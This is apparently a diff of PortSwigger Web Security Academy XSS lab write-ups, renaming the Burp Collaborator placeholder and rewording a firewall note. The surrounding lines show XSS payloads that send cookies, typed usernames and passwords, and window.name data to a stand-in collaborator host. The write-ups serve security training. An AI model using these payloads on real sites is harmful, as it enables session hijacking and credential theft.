@@ -342,7 +342,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ```html
 <script>
-    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+    fetch('https://burp-collab-subdomain', {
     method: 'POST',
     mode: 'no-cors',
     body:document.cookie
@@ -376,7 +376,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 ```html
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+<input type=password name=password onchange="if(this.value.length)fetch('https://burp-collab-subdomain',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
@@ -744,7 +744,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 ```html
 <script>
 if(window.name) {
-    new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+    new Image().src='//burp-collab-subdomain?'+encodeURIComponent(window.name);
     } else {
         location = 'https://lab-id.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
 }
@@ -764,7 +764,7 @@ if(window.name) {
 
 ### Exploitability
 
-To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.
+To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.
 
 ----
 
